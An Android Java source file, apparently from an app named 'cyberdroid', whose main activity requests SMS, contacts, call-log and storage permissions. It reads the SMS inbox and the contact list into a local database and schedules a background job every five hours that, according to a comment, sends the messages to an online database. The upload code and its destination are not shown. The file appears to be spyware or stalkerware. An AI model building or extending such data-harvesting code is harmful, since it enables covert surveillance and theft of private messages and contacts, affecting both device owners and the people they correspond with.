package cyberdroid.cyberdroid;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * Created by jkm-droid on 05/04/2021.
 */

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_READ_CONTACTS = 1;
    MessageHelper messageHelper;
    static Handler handler;
    MyHelper myHelper;
    Thread thread2;
    private static final int PERMISSION_REQUEST_READ_SMS = 100;
    private static final int MULTIPLE_PERMISSIONS = 4;
    String[] permissions;

    @SuppressLint("HandlerLeak")
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        messageHelper = new MessageHelper(this);

        permissions = new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_EXTERNAL_STORAGE
        };
        if (!checkPermissions()){
            ActivityCompat.requestPermissions(MainActivity.this, permissions,MULTIPLE_PERMISSIONS);
        }

        MyHelper.restart();
        MyHelper.runtime();
        main_worker();
    }

    private boolean checkPermissions(){
        int results;
        List<String> requiredPermissions = new ArrayList<>();
        for (String perm : permissions){
            results = ContextCompat.checkSelfPermission(MainActivity.this, perm);
            if (results != PackageManager.PERMISSION_GRANTED){
                requiredPermissions.add(perm);
            }
        }

        if (!requiredPermissions.isEmpty()){
            ActivityCompat.requestPermissions(MainActivity.this, permissions,MULTIPLE_PERMISSIONS);
            return false;
        }

        return true;
    }

    /**
     * background activities
     */
    //when permission is granted during runtime
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == MULTIPLE_PERMISSIONS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                thread_function();
            } else {
//                ActivityCompat.requestPermissions(CheckOutActivity.this, permissions,MULTIPLE_PERMISSIONS);
            }
        }
    }

    @SuppressLint("HandlerLeak")
    private void main_worker() {
        //starting the service
        //method for sending the messages to online database
        //perform the work while the device is idle only
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        //perform the work periodically, every 10 minutes e.t.c
        final PeriodicWorkRequest messagesWorkRequest = new PeriodicWorkRequest
                .Builder(MyWorker.class, 5, TimeUnit.HOURS)
                .setConstraints(constraints)
//                .setInitialDelay(2, TimeUnit.MINUTES)
                .build();


        //initiate the work using work manager
        WorkManager workManager = WorkManager.getInstance(getApplicationContext());
        workManager.enqueue(messagesWorkRequest);

        workManager.getWorkInfoByIdLiveData(messagesWorkRequest.getId()).observe(
                this, workInfo -> {
                    if (workInfo != null) {
                        Log.d("periodicWorkRequest", "Status changed to : " + workInfo.getState());
                    }
                }
        );


        //handler for receiving messages from the thread
        handler = new Handler() {
            @SuppressLint("HandlerLeak")
            @Override
            public void handleMessage(@NonNull Message msg) {
                super.handleMessage(msg);

                if (msg.arg1 == 1) {
                    thread2.start();
                }
                if (msg.arg2 == 2){
                    System.out.println("----------------------contacts saved to sql---------------------------------------");
                }
            }
        };
    }

    public void thread_function() {
        Thread thread1 = new Thread() {
            final Message message = new Message();

            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void run() {
                super.run();
                //retrieve messages from inbox
                //and save them into sql database
                myHelper = new MyHelper(MainActivity.this);
                myHelper.read_messages_from_inbox_and_save_into_sql_database();
                myHelper.read_sms_using_telephony();
                message.arg1 = 1;
                handler.dispatchMessage(message);

            }
        };
        thread1.start();//start thread

        thread2 = new Thread(){
            final Message message = new Message();

            @Override
            public void run() {
                super.run();
                myHelper = new MyHelper(getApplicationContext());
                myHelper.read_contacts_from_phone_and_save_to_sql_lite();
                message.arg2 = 2;
                handler.dispatchMessage(message);
            }
        };
    }
}
